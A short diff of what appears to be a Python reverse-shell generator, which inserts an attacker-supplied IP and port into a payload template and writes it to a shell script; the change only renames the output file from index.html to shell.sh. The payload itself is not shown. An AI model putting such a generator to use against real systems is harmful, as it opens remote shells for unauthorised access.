@@ -29,8 +29,7 @@ if(len(sys.argv) < 3):
 
 payload = payload.replace("x.x.x.x", sys.argv[1]).replace("yyyy", sys.argv[2])
 
-with open("index.html", "w") as f:
+with open("shell.sh", "w") as f:
     f.write("#! /bin/sh\n\n" + payload)
 
-print("[+] Wrote Linux reverse shells to {}/index.html".format(os.getcwd()))
-
+print("[+] Wrote Linux reverse shells to {}/shell.sh".format(os.getcwd()))
